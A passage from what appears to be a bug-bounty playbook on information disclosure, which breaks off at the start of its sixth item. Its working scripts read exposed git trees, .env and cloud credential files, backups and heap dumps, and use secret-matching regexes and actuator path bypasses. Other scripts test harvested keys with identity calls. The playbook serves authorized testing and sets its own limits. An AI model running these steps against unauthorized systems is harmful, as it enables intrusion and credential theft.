# INF · Information disclosure, secrets & exposed files

> The target hands out something it was supposed to keep: a credential, its source code, another user's personal
> data, or the state of a running process. It pays when the disclosed thing grants access or is private data of
> someone else. A page that only describes the server (a version, a path, an internal address, a key that is
> public by design) is closed as informative on almost every programme.

| | |
|---|---|
| **Class** | `disclosure` |
| **Applies when** | http |
| **Pays** | 1,780 disclosed reports, 351 paid, median $500, top $50,000. The best-paid ones were a live credential that opened source code or internal systems, or an API response that carried other users' private fields; pages that only describe the server were rarely paid. |
| **Weaknesses** | Information Disclosure · CWE-200 · Information Exposure Through Debug Information · CWE-215 · Information Exposure Through an Error Message · CWE-209 · Information Exposure Through Directory Listing · CWE-548 · Information Exposure Through Sent Data · CWE-201 · Password in Configuration File · CWE-260 · Use of Hard-coded Credentials · CWE-798 · Insecure Storage of Sensitive Information · CWE-922 · Privacy Violation · CWE-359 · Improper Removal of Sensitive Information Before Storage or Transfer · CWE-212 · Use of Cache Containing Sensitive Information · CWE-524 · Forced Browsing · CWE-425 |

## Why it pays

Four in five disclosed reports in this class were not paid (155 of them went to one programme, which paid a
single one), and the median of the paid fifth is $500. The money is at the top and follows one rule: the
disclosed thing let the reporter into something. A GitHub token inside a public desktop app (#1087489, $50,000),
a client certificate committed to a git repository (#591813, $40,000), registry credentials in an employee's
public repository (#911606, $15,000), an SVN working copy under the web root (#72243, $10,000), `/heapdump` and
`/env` on Spring Boot (#838635, $12,500; #862589, $5,000), an error page that printed `secret_key_base`
(#460545, $3,500).

The second paying shape needs no misconfigured server. The application serializes more than the page shows:
every runner token of a project in a JSON response (#509924, $12,000), any user's e-mail address in a mutation
result or an invitation flow (#2032716, $12,500; #807448, $7,500), internal attachments inside an export
(#186230, $12,500). These need accounts and an understanding of the product, so they are rarely duplicates.

What does not pay is the scanner's list. Counting by title in the report index: `phpinfo()` 27 reports, one paid
($60); directory listing 52 reports, one paid, and that one (#909374, $1,800) was filed with a code-analysis
programme under a Java CWE-548 title, not for a listing on a host (#301812 paid $1,000 under the
directory-listing weakness because the listing led to source code); `/server-status` and its relatives 11, none
paid; stack traces and full paths 64, seven paid, none above $140; source maps 3, none paid. Those same files
are requested by every scanner within hours of a host appearing, so the few that do hold a secret are usually
duplicates. Check them quickly, then spend the time on INF-010 to INF-013, INF-015 and INF-016.

## The crux question

**Does this give me access to something, or someone else's private data, that an anonymous visitor reading the
public site could not already have?**

## Applicability probe

The chapter gate is `http`. The same four observations settle the facts the unauthenticated items are gated
on: `redirect-only`, the stack tags (`spring`, `php`, `python`, `ruby`), `spa` and `source-maps`, and `cache`.
`login`, `api`, `params` and `upload` come from the application map (PB-04); they gate INF-009 to INF-014.

```bash
source "$E/env.sh"; mkdir -p "$E/recon/$H"
# 1. The host answers HTTP; note where / goes
curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code} %{size_download} %{content_type} -> %{redirect_url}\n' "$T/"
# 2. Soft-404 baseline: a random path, a random dot-file, a random backup name, a random directory
R="sane$RANDOM$RANDOM"
for p in "/$R" "/.$R" "/$R.bak" "/$R/"; do
  curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} %{size_download} %{content_type} -> %{redirect_url} $p\n" "$T$p"
done | tee "$E/recon/$H/soft404.txt"
# 3. Stack and cache markers in the headers and in the error page
curl -sS "${HDR[@]}" -D- -o "$E/recon/$H/error-page.html" "$T/$R" \
  | grep -iE '^(server|x-powered-by|set-cookie|x-runtime|x-application-context|x-debug-token|via|age|x-cache|cf-cache-status):'
grep -oE 'Whitelabel Error Page|DEBUG = True|Symfony|Whoops|Routing Error|Werkzeug' "$E/recon/$H/error-page.html" | sort -u
# 4. Bundles and source maps already on disk from the fingerprint
ls "$E/recon/$H/js/" 2>/dev/null | head; grep -rlE 'sourceMappingURL=' "$E/recon/$H/js/" 2>/dev/null | head -5
```

```bash
scripts/sane fact set "$H" http=1 redirect-only=0 --ev "200 on /; random path 404 (1245 bytes), random dot-file 404, random .bak 404"
scripts/sane fact set "$H" spring=1 java=1 --ev "Whitelabel Error Page on a random path"
scripts/sane fact set "$H" spa=1 source-maps=1 --ev "main.4f2a.js ends with sourceMappingURL=main.4f2a.js.map; the map answers 200 application/json"
scripts/sane fact set "$H" cache=1 --ev "CF-Cache-Status: HIT and Age: 41 on the second request for /static/app.css"
# every path redirects to another host:
scripts/sane fact set "$H" redirect-only=1 --ev "/ and a random path both 301 to another host"
# nothing speaks HTTP:
scripts/sane fact set "$H" http=0 --ev "no HTTP answer on 80, 443, 8080, 8443 (sane fp, $(date -u +%F))"
```

With `http=0` the chapter closes for the asset and the planner writes the reason; open non-web services belong
to the network chapter. When a random path answers 200, write the size of that page into the evidence text: it
is the control for INF-001 to INF-003, INF-008 and INF-017. INF-015 and INF-016 run once per programme, on the
asset `@programme`, and need no fact about any single host.

## Triage order

INF-001 and INF-002 (a dozen requests, the highest unauthenticated ceiling) → INF-005, INF-006, INF-007
(whichever stack the asset has) → INF-004 (the bundles are already on disk) → INF-008 → INF-003 → INF-017 (per
host) → INF-015 and INF-016 (once per programme, early: live credentials are time-sensitive and duplicates are
decided by hours) → with accounts: INF-010 → INF-012 → INF-011 → INF-013 → INF-009 → INF-014.

## Items

### INF-001 · A version-control directory under the web root is served and private source can be rebuilt from it

| | |
|---|---|
| **Severity** | Medium standalone for private source code without a secret; High when the tree or `.git/config` holds a credential proven live; Critical when that credential reaches production data |
| **Requires** | !redirect-only |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Disclosure · CWE-527 |
| **Prior art** | #72243, #317119, #218465, #1078432 |

- **Where:** the web root and every application prefix the crawl shows (`/app/`, `/api/`, `/blog/`, `/static/`,
  a versioned path). A deploy that runs `git pull` or `svn up` in place leaves the metadata directory in each of
  them. Hosts that answer 403 on `/` are worth the same dozen requests: the directory index is blocked, the files
  under it often are not.
- **Test:** ask for files with a fixed, recognisable format, not for the directory. `HEAD` starts with
  `ref: refs/heads/` or is a 40-hex hash, `config` contains `[core]`, `index` starts with the bytes `DIRC`,
  `wc.db` starts with `SQLite format 3`. Then read the file list from the index and fetch one object.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-001"; mkdir -p "$D"; P=""       # P: path prefix under test, empty for the web root
  W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  get(){ curl -sS "${HDR[@]}" --path-as-is -o "$D/$2" -w "%{http_code} %{size_download} %{content_type} $1\n" "$T$P$1"; sleep "$W"; }
  get "/.git/sane$RANDOM" control        # control: what a missing file under /.git/ looks like on this host
  get /.git/HEAD HEAD; get /.git/config config; get /.git/index index; get /.git/logs/HEAD logs-HEAD
  get /.svn/wc.db wc.db; get /.svn/entries entries; get /.hg/requires hg-requires; get /.bzr/branch-format bzr
  head -c 80 "$D/HEAD"; grep -c '^\[core\]' "$D/config"; head -c 4 "$D/index" | xxd -p; head -c 15 "$D/wc.db"
  #   a hit prints:  ref: refs/heads/<branch>  |  1  |  44495243  |  SQLite format 3
  grep -iE 'url *=' "$D/config"          # the remote; https://user:token@host/... in it is a credential by itself
  ```
  ```bash
  # the file list comes from the index alone; no object is needed for it
  mkdir -p "$D/wt" && git -C "$D/wt" init -q && cp "$D/index" "$D/wt/.git/index" && git -C "$D/wt" ls-files --stage > "$D/files.txt"
  wc -l < "$D/files.txt"
  grep -iE '\.env|secret|credential|passw|\.pem$|\.key$|id_rsa|\.sql$|wp-config|database\.yml|settings\.py|config\.(php|json|ya?ml)' "$D/files.txt" | head -20
  # one blob by its hash: a loose object is a zlib stream of "blob <size>\0<content>"
  blob(){ curl -sS "${HDR[@]}" "$T$P/.git/objects/${1:0:2}/${1:2}" \
    | python3 -c 'import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))' | tr -d '\0' | head -c 1500; }
  blob <40-hex hash from files.txt>
  # loose object 404 = packed repository: list the packs, then read the size of one without downloading it
  curl -sS "${HDR[@]}" "$T$P/.git/objects/info/packs"
  curl -sS "${HDR[@]}" -r 0-11 -D- -o /dev/null "$T$P/.git/objects/pack/<pack-name>.pack" | grep -iE '^(HTTP|content-range|content-length)'
  # SVN 1.7+: names and hashes from wc.db; a pristine copy is /.svn/pristine/<first two hex>/<sha1>.svn-base
  sqlite3 "$D/wc.db" "select local_relpath, checksum from NODES where kind='file' limit 20"
  ```
  SVN 1.6 and older keeps a text `entries` file per directory and the source at
  `/<dir>/.svn/text-base/<name>.svn-base`. Do not mirror the repository: fetch only the blobs whose names point
  at configuration, at `$RATE`. A packed repository cannot be read blob by blob; record the pack name and size
  and let the programme decide whether the pack may be downloaded.
- **Proof:** `HEAD` and `config` as served, the number of tracked files with ten names from the index, and the
  first lines of one decompressed blob that is plainly private server-side code. For a credential: the file and
  key name, the value cut to its first and last four characters, and the output of one read-only identity call
  (`aws sts get-caller-identity` for an AWS key pair, `curl -sS -H "Authorization: Bearer <token>"
  https://api.github.com/user` for a GitHub token; INF-002 lists more). Make no second call.
- **Not a finding when:** every path under `/.git/` returns 200 with the same HTML (compare with `control`; the
  formats above do not match). Only `HEAD` is readable and `config`, `index` and objects are refused: nothing can
  be rebuilt. The remote in `config` is a public repository and the tree is that repository: an open-source
  site, a documentation site, a theme or plugin checked out from its public upstream. `.gitignore`,
  `.gitattributes` or `.gitkeep` alone are file names, not a repository.
- **Escalate:** read the configuration blobs first (`.env`, `config/*.yml`, `settings.py`, CI files), then
  `logs/HEAD` and `packed-refs` for branch names and committer addresses. Framework secrets feed DSR-009 (Laravel
  `APP_KEY`), DSR-011 (Rails `secret_key_base`) and JWT-004 (signing secret). Routes and role checks in the
  source are the work list for the access-control and API chapters; internal package names feed the
  dependency-confusion item of the client-side chapter.

### INF-002 · An environment or configuration file under the web root is served with live credentials

| | |
|---|---|
| **Severity** | High standalone when one credential in the file is proven live; Critical for a cloud, payment or source-host key with production reach; Low when every value is a placeholder, local or dead |
| **Requires** | !redirect-only |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Password in Configuration File · CWE-260 |
| **Prior art** | #964603, #786609, #2784712, #401098 |

- **Where:** the web root and each application prefix from the crawl. The same list is worth one pass on every
  sibling host of the deployment that has its own document root (`staging.`, `dev.`, `old.`, an admin host).
- **Test:** the document root is the project directory instead of its `public/` folder, or a deploy copied the
  whole project. The server has no handler for dot-files, `.json`, `.yml` or `.log`, so it returns them as
  static text. Request the known names, compare with a control of the same shape, and read key names before
  values.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-002"; mkdir -p "$D"; P=""; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  for f in "/sane$RANDOM.env" "/.sane$RANDOM" "/sane$RANDOM.json" "/sane$RANDOM.yml"; do      # controls, one per file shape
    curl -sS "${HDR[@]}" -o /dev/null -w "CONTROL %{http_code} %{size_download} %{content_type} $f\n" "$T$P$f"; sleep "$W"; done
  for f in /.env /.env.local /.env.production /.env.prod /.env.staging /.env.dev /.env.bak /.env.old /.env.save \
    /config.json /config.js /env.js /env.json /settings.json /appsettings.json /appsettings.Development.json \
    /config/database.yml /config/secrets.yml /config/master.key /config/parameters.yml /app/config/parameters.yml \
    /local_settings.py /web.config /WEB-INF/web.xml /.aws/credentials /.npmrc /.docker/config.json \
    /docker-compose.yml /.htpasswd /sftp-config.json /.vscode/sftp.json /storage/logs/laravel.log \
    /terraform.tfstate /.gitlab-ci.yml /phpunit.xml; do
    curl -sS "${HDR[@]}" --path-as-is -r 0-65535 --max-filesize 5000000 -o "$D/$(printf %s "$f" | tr '/' '_')" \
      -w "%{http_code} %{size_download} %{content_type} $f\n" "$T$P$f"; sleep "$W"
  done | tee "$D/sweep.txt" | grep -E '^(200|206) '
  # which answers hold secrets: key names first
  grep -liE '^[A-Z0-9_]+=|"[A-Za-z_]*(secret|passw|token|api_?key|private_?key)[A-Za-z_]*" *:|AKIA[0-9A-Z]{16}|BEGIN [A-Z ]*PRIVATE KEY' "$D"/_* 2>/dev/null
  grep -hoE '^[A-Z0-9_]*(KEY|SECRET|TOKEN|PASS|PASSWORD|DSN|URL)[A-Z0-9_]*=' "$D"/_.env* 2>/dev/null | sort -u
  ```
  ```bash
  # one read-only identity call for one credential, then stop
  AWS_ACCESS_KEY_ID='<AKIA...>' AWS_SECRET_ACCESS_KEY='<secret>' aws sts get-caller-identity
  K='<token from the file>'
  curl -sS -D- -H "Authorization: Bearer $K" https://api.github.com/user | grep -iE '^x-oauth-scopes|"login"|"message"'
  curl -sS -H "PRIVATE-TOKEN: $K" https://gitlab.com/api/v4/user | head -c 300
  curl -sS -H "Authorization: Bearer $K" https://slack.com/api/auth.test
  ```
  Database, SMTP, SSH, FTP and admin-panel passwords have no identity call. Do not log in with them: report the
  file. `config/master.key` together with `config/credentials.yml.enc` decrypts offline
  (`RAILS_MASTER_KEY=<key> bin/rails credentials:show` in an empty Rails project holding the `.enc` file).
- **Proof:** the response as served (status, content type, first lines) with every value cut to its first and
  last four characters, the list of key names, and for one credential the identity call's output naming the
  principal (account id and ARN, login and scopes, team). State the time of the call. Without a live credential
  the report is the file and what its key names show, rated lower.
- **Not a finding when:** the file is `.env.example`, `.env.dist` or `.env.sample` with placeholders. The JSON
  is the front end's runtime configuration: API base URL, feature flags and keys that are public by design
  (Firebase web config, Stripe `pk_live_`, Sentry DSN, Google Maps browser key, reCAPTCHA site key, an OAuth
  `client_id`, Auth0 or Cognito pool and client ids). The values are a developer's local set (`APP_ENV=local`,
  `DB_HOST=127.0.0.1`, password `secret`) and nothing validates. The identity call says the key is revoked. The
  200 is the soft-404 page. `package.json`, `composer.json` or a lock file alone list dependencies
  (`version-disclosure`).
- **Escalate:** `APP_KEY` goes to DSR-009, `secret_key_base` to DSR-011, a `machineKey` in `web.config` to
  DSR-005, a Django `SECRET_KEY` to DSR-010, a JWT secret to JWT-004. Cloud keys and bucket names go to the
  cloud chapter: describe what the role name says it can do and stop. `laravel.log` holds stack traces with
  request data of real users: read no further than the first entry (PB-14).

### INF-003 · A backup, editor or archive copy of server-side source is served as plain text

| | |
|---|---|
| **Severity** | Medium standalone for server-side source or a database dump that anyone can download; High when it holds a live credential or user records; Low for a `.DS_Store` that names non-public files |
| **Requires** | !redirect-only |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Information Disclosure · CWE-530 |
| **Prior art** | #142549, #389454, #1081817, #1516520 |

- **Where:** every server-side file name the application reveals (`index.php`, `config.php`, `login.aspx`, a
  path in an error message, a name in a bundle) and every directory seen in the crawl. Archive names are derived
  from the host name. `.DS_Store` in each directory gives real names to feed back into the list.
- **Test:** the handler mapping goes by extension. `config.php` is executed; `config.php.bak`, `config.php~`,
  `.config.php.swp` and `config.php.save` are not, so the server returns the source. Someone also zipped the web
  root or dumped the database next to it. Fetch only the first bytes of each candidate: the magic bytes decide.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-003"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # 1. names from .DS_Store (macOS Finder index) in each directory the crawl showed
  for d in / /admin/ /backup/ /uploads/ /includes/ /assets/; do
    curl -sS "${HDR[@]}" -o "$D/ds$(printf %s "$d" | tr '/' '_')" -w "%{http_code} %{size_download} $d.DS_Store\n" "$T$d.DS_Store"; sleep "$W"; done
  python3 - "$D"/ds_* <<'PY'
  import re, sys
  TYPES = (b'blob', b'bool', b'long', b'shor', b'type', b'ustr', b'comp', b'dutc')
  for p in sys.argv[1:]:
      b = open(p, 'rb').read()
      if b[4:8] != b'Bud1': continue                      # not a .DS_Store: the soft-404 page
      names = set()
      for m in re.finditer(rb'(?=\x00\x00\x00([\x01-\x7f]))', b):
          n = m.group(1)[0]; s = m.start() + 4; tail = b[s + 2 * n:s + 2 * n + 8]
          if len(tail) == 8 and tail[4:] in TYPES: names.add(b[s:s + 2 * n].decode('utf-16-be', 'replace'))
      print(p, sorted(names))
  PY
  # 2. copies of files the application names itself
  printf '%s\n' /index.php /config.php /wp-config.php /login.php /settings.py /web.config > "$D/names.txt"   # this asset's real paths
  while read -r f; do d=${f%/*}; n=${f##*/}
    for v in "$f.bak" "$f.old" "$f.orig" "$f.save" "$f.swp" "$f.txt" "$f~" "$f.1" "$d/.$n.swp" "$d/%23$n%23" "${f%.*}.bak" "${f%.*}.old"; do
      curl -sS "${HDR[@]}" --path-as-is -r 0-2047 -o "$D/c$(printf %s "$v" | tr '/%' '__')" \
        -w "%{http_code} %{size_download} %{content_type} $v\n" "$T$v"; sleep "$W"
    done; done < "$D/names.txt" | grep -E '^(200|206) '
  grep -lE '<\?php|<%@|^import |^from .+ import |require\(|DB_PASSWORD|connectionString' "$D"/c_* 2>/dev/null
  # 3. archives and dumps named after the site: first kilobyte only
  B=${H%%.*}; A=$(printf %s "$H" | awk -F. '{print $(NF-1)}')
  for n in "$B" "$A" "$H" backup site www html public_html web db database dump; do for x in zip tar.gz tgz tar rar 7z sql sql.gz; do
    curl -sS "${HDR[@]}" -r 0-1023 -o "$D/a_$n.$x" -w "%{http_code} %{size_download} %{content_type} /$n.$x\n" "$T/$n.$x"; sleep "$W"
  done; done | grep -E '^(200|206) '
  file "$D"/a_* | grep -E 'Zip archive|gzip compressed|tar archive|RAR archive|7-zip|SQL|ASCII text' | grep -v 'HTML'
  curl -sSI "${HDR[@]}" "$T/<hit>" | grep -iE '^(content-length|last-modified)'      # full size and age of a hit
  ```
- **Proof:** for a source copy, the request and the first 10 to 20 lines showing server-side code, credentials
  cut to four characters each side. For an archive or dump: its URL, magic bytes, full size and `Last-Modified`
  from the HEAD request, and the smallest part that shows what it is (the first kilobyte of a dump with the
  database name and one `CREATE TABLE`; the name list of an archive). Download a whole archive only when it is
  small and the policy does not forbid it, list it (`unzip -l`, `tar -tzf`), open one configuration file, and
  delete the copy.
- **Not a finding when:** the copy is executed and you receive the rendered page (the handler matched). The
  200 is the soft-404 page (`file` says HTML). The archive is a download the site links to on purpose (a
  release, a plugin, a press kit). The `.bak` holds a template or front-end code that is public anyway. The
  `.DS_Store` names only assets the site already links: most programmes close it as informative, #142549 ($560)
  is the exception. A dump that holds user rows is a finding, and also an incident: stop at the first record
  and follow PB-14.
- **Escalate:** a credential in the copy gets one read-only identity call and nothing more
  (`aws sts get-caller-identity` for an AWS key pair, `curl -sS -H "Authorization: Bearer <token>"
  https://api.github.com/user` for a GitHub token; INF-002 lists the others); database, SMTP and SSH passwords
  are reported unvalidated. Recovered source is read for flaws the black-box tests cannot see and reported
  under that class. Names from `.DS_Store` and from the archive listing go back into step 2 and into INF-017.

### INF-004 · A credential shipped in a JavaScript bundle or its source map authenticates to a non-public service

| | |
|---|---|
| **Severity** | High standalone when one identity call proves the credential live on a non-public service; Critical for a cloud, source-host or payment secret key; None for a key that is public by design |
| **Requires** | spa\|source-maps |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Use of Hard-coded Credentials · CWE-798 |
| **Prior art** | #983331, #1717210, #1051029, #2923061 |

- **Where:** every first-party script: the bundles in `$E/recon/$H/js/`, inline configuration blocks
  (`window.__ENV__`, `__NEXT_DATA__`, `window.config`), `/env.js`, `/config.js`, `/asset-manifest.json`,
  `/_next/static/<build>/_buildManifest.js`, and the lazy chunks those manifests name, which include admin
  screens the landing page never loads. Source maps: the URL in each bundle's `sourceMappingURL` comment or
  `SourceMap` response header, or `<bundle>.js.map`.
- **Test:** the build inlines every environment variable the client code references (`REACT_APP_*`,
  `NEXT_PUBLIC_*`, `VITE_*`, anything behind `process.env`), so a server-side secret used by mistake ends up in
  the bundle. A source map adds the original files in `sourcesContent`: comments, configuration modules, code
  for routes the interface hides. Find strings with a secret's format, separate public-by-design keys from
  secrets, and validate one secret with one read-only identity call.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-004"; mkdir -p "$D/maps"; J="$E/recon/$H/js"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # 1. source maps for the bundles the page loads (in-scope hosts only), unpacked to $D/maps/src
  curl -sS "${HDR[@]}" "$T/" | grep -oE '(src|href)="[^"]+\.js[^"]*"' | cut -d'"' -f2 \
    | sed -E "s#^//#https://#; s#^/#$T/#; /^https?:/! s#^#$T/#" | sort -u | scripts/sane scope filter > "$D/bundles.txt"
  while read -r u; do u=${u%%\?*}
    curl -sS "${HDR[@]}" -o "$D/maps/$(basename "$u").map" -w "%{http_code} %{size_download} %{content_type} $u.map\n" "$u.map"; sleep "$W"
  done < "$D/bundles.txt"
  python3 - "$D"/maps/*.map <<'PY'
  import json, os, sys
  for p in sys.argv[1:]:
      try: m = json.load(open(p, encoding='utf-8'))
      except Exception: continue                           # an HTML soft 404 is not JSON
      for name, src in zip(m.get('sources', []), m.get('sourcesContent') or []):
          if not src or 'node_modules' in name: continue
          out = os.path.join(os.path.dirname(p), 'src', os.path.normpath('/' + name.split('://')[-1]).lstrip('/'))
          os.makedirs(os.path.dirname(out), exist_ok=True); open(out, 'w', encoding='utf-8').write(src)
  PY
  # 2. secret-shaped strings in the bundles and in the recovered source (offline)
  grep -rnoE 'A[KS]IA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{60,}|glpat-[A-Za-z0-9_-]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|[sr]k_live_[A-Za-z0-9]{20,}|SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}|AIza[0-9A-Za-z_-]{35}|-----BEGIN [A-Z ]*PRIVATE KEY-----|hooks\.slack\.com/services/[A-Za-z0-9/]+|eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]+' "$J" "$D/maps/src" | sort -u | head -50
  grep -rnoiE "(client[_-]?secret|api[_-]?secret|private[_-]?key|passw(or)?d|auth[_-]?token|authorization)[\"' ]*[:=] *[\"'][^\"']{8,}" "$J" "$D/maps/src" | head -60
  # 3. one read-only identity call for one candidate, then stop
  K='<candidate>'
  AWS_ACCESS_KEY_ID='<AKIA...>' AWS_SECRET_ACCESS_KEY='<its secret>' aws sts get-caller-identity   # both halves are needed
  curl -sS -D- -H "Authorization: Bearer $K" https://api.github.com/user | grep -iE '^x-oauth-scopes|"login"|"message"'   # ghp_ gho_ github_pat_
  curl -sS -H "PRIVATE-TOKEN: $K" https://gitlab.com/api/v4/user | head -c 300                     # glpat-
  curl -sS -H "Authorization: Bearer $K" https://slack.com/api/auth.test                           # xoxb- xoxp-
  curl -sS -u "$K:" https://api.stripe.com/v1/account | head -c 300                                # sk_live_ rk_live_
  curl -sS -H "Authorization: Bearer $K" https://api.sendgrid.com/v3/scopes | head -c 300          # SG.
  ```
  `trufflehog filesystem "$J" "$D/maps/src" --no-verification --json` does step 2 with more patterns; keep
  verification manual so that exactly one call is made. A Slack webhook URL has no read-only call (posting is a
  write): report it unvalidated. A JWT is decoded offline; check `exp` and whose it is before anything else.
- **Proof:** the bundle or map URL and the line holding the key (first and last four characters), the code path
  that shows what the application uses it for, and the identity call's output naming the principal and its
  scopes or role. Say what those scopes allow according to the provider's documentation. Make no second call.
- **Not a finding when:** the key is public by design: a Google Maps or Places browser key (`AIza...`; a few
  programmes paid a small amount when the key had no referrer or API restriction, #3250315 at $500, most do
  not), a Firebase web config (`apiKey`, `authDomain`, `projectId`: any weakness is in the database rules,
  which is the cloud chapter), a Stripe publishable key (`pk_live_`), a Sentry DSN, an Algolia search-only key
  (#2923061 was closed as not applicable), a Mapbox `pk.` token, a reCAPTCHA site key, Segment, Mixpanel or
  Amplitude write keys, an OAuth or Cognito client id, a Pusher app key. The identity call fails: revoked, a
  test key (`sk_test_`), a documentation example (`AKIAIOSFODNN7EXAMPLE`). The string is a hash, a build id, a
  public key or a CSRF token. The token is our own session's, rendered per user: fetch the same file anonymously
  and compare. The key belongs to a vendor's SDK, not to the organisation (`third-party`). Published source
  maps with nothing secret in them are informative: three reports name source maps in the title and none was
  paid (#845677 is one).
- **Escalate:** the recovered source lists routes and role checks the interface hides: the work list for the
  access-control and API chapters. A signing secret goes to JWT-004. Firebase and bucket identifiers go to the
  cloud chapter. An Algolia key is checked with its own identity call (`GET /1/keys/<key>` on the application's
  Algolia host returns its `acl`); anything beyond `search` is a finding. Old builds of the same bundles are in
  the archives: INF-017.

### INF-005 · Spring Boot actuator endpoints answer without authentication and return environment values or a heap dump

| | |
|---|---|
| **Severity** | High standalone when `/env`, `/configprops`, `/heapdump` or the request trace is readable; Critical when a credential read from it is proven live with one identity call; Low for route, bean or metric listings only |
| **Requires** | spring |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Exposure Through Debug Information · CWE-215 |
| **Prior art** | #838635, #862589, #1022048, #1019367 |

- **Where:** Spring Boot 2 and later: `/actuator` (a JSON index of `_links`) and the endpoints under it. Boot
  1: `/env`, `/trace`, `/dump`, `/heapdump`, `/mappings`, `/configprops` at the context root. Custom base paths:
  `/manage`, `/management`, `/admin/actuator`, `/api/actuator`, `/internal/actuator`, and each context path the
  crawl shows (`/api/v1/actuator`). #862589 was on a custom path that the owner's own scans missed.
- **Test:** the management endpoints are exposed over HTTP (`management.endpoints.web.exposure.include=*`) and
  not covered by the security configuration, or a proxy rule blocks only the literal path. `env` and
  `configprops` print configuration, `heapdump` returns the JVM heap with every secret and session in memory,
  `httptrace` (Boot 2) or `httpexchanges` (Boot 3) returns recent requests with their headers.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-005"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  g(){ curl -sS "${HDR[@]}" --path-as-is -H 'Accept: application/json' -r 0-65535 -o "$D/$(printf %s "$1" | tr '/;.%' '____').json" \
       -w "%{http_code} %{size_download} %{content_type} $1\n" "$T$1"; sleep "$W"; }
  for b in /actuator /manage /management /admin/actuator /api/actuator /internal/actuator; do g "$b"; done   # index: look for "_links"
  for e in /env /trace /mappings /configprops; do g "$e"; done                                                # Boot 1 layout
  B=/actuator                                                                                                 # the base that answered
  for e in env configprops mappings httptrace httpexchanges loggers threaddump logfile beans sessions gateway/routes jolokia/list; do g "$B/$e"; done
  # the plain path is refused by a proxy: the same handler through path parameters and normalisation
  for v in "$B;/env" "$B/env;.css" "$B/env/" "/;$B/env" "$B/..;$B/env" "/%61ctuator/env" "$B/env.json"; do g "$v"; done
  # secret-looking keys whose value Spring did not mask with ******, value cut to six characters
  grep -oiE '"[^"]*(pass|pwd|secret|key|token|credential|jdbc|dsn|url)[^"]*" *: *(\{ *"value" *: *)?"[^"*]{4,}"' "$D/_actuator_env.json" \
    | sed -E 's/("[^"]{0,6})[^"]*"$/\1..."/' | head -40
  # heap dump: ask once, first bytes only. Each request makes the JVM write a full dump and pause while it does.
  curl -sS "${HDR[@]}" -r 0-31 --max-time 30 -D "$D/heapdump.headers" -o "$D/heapdump.first32" "$T$B/heapdump"
  xxd "$D/heapdump.first32" | head -2; grep -iE '^(HTTP|content-(type|length|range|disposition))' "$D/heapdump.headers"
  ```
  A dump starts with `JAVA PROFILE 1.0` (or the gzip magic `1f8b` on Boot 1). Do not download it: it holds other
  users' sessions and credentials. Send GET only. `POST` to `/env`, `/refresh`, `/restart`, `/shutdown`,
  `/loggers` or `/gateway/routes` changes the running application.
- **Proof:** the `_links` index naming the exposed endpoints, the `env` or `configprops` response with one
  unmasked secret (name, value cut to four characters each side), or the heap dump's headers and first 32 bytes
  with its `Content-Length`. For the request trace: one entry with header names visible and the `Cookie` and
  `Authorization` values redacted to their shape.
- **Not a finding when:** only `health` (`{"status":"UP"}`) and `info` answer: they are meant to be public, and
  a commit id in `info` is `version-disclosure`. The index lists only those two. Every value in `env` is
  `******` (Boot 3 masks all values by default) and no dump, trace or log file is readable: key names alone are
  low or informative. `prometheus` or `metrics` alone are counters. The 200 is the single-page app's
  `index.html` (content type `text/html`). A `/env` that belongs to another product.
- **Escalate:** a credential read from `env` gets one read-only identity call and nothing more
  (`aws sts get-caller-identity` for an AWS key pair, `curl -sS -H "Authorization: Bearer <token>"
  https://api.github.com/user` for a GitHub token; INF-002 lists the others); database and broker passwords
  are reported unvalidated. `mappings` is the complete route table for the access-control and API chapters. An
  actuator that is closed from outside is still a target for SSR-003 (`http://localhost:8080/actuator/env`).
  `gateway/routes` and `jolokia` have their own CVE history: use the advisory's read-only check from the CVE
  chapter, never the write.

### INF-006 · A PHP debug surface is public: Laravel debug mode or Telescope, the Symfony profiler, a debug bar or `phpinfo()`

| | |
|---|---|
| **Severity** | Low standalone for `phpinfo()` or a debug page without secrets; High when the page prints `APP_KEY`, a live credential or the stored requests of other visitors |
| **Requires** | php |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Exposure Through Debug Information · CWE-215 |
| **Prior art** | #1883806, #2765259, #401098, #165930 |

- **Where:** Laravel: any route that can be made to throw, `/telescope`, `/horizon`, `/_debugbar/open`,
  `/_ignition/health-check`, `/log-viewer`, `/storage/logs/laravel.log`. Symfony: the `X-Debug-Token` response
  header, `/_profiler/`, `/app_dev.php/`. Yii: `/debug/default/index`. Any PHP host: `phpinfo.php`, `info.php`
  and their usual names.
- **Test:** debug mode answers an exception with a page that prints stack frames with source and request data;
  Laravel 5 (Whoops) adds every environment variable under "Environment & details". Telescope, the Symfony
  profiler and the debug bar store each recent request of every visitor, with headers, session and queries, and
  show them to whoever opens the route. `phpinfo()` prints `$_ENV` and `$_SERVER`, which is where containers
  keep their secrets.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-006"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); M="sane-inf006-$RANDOM"
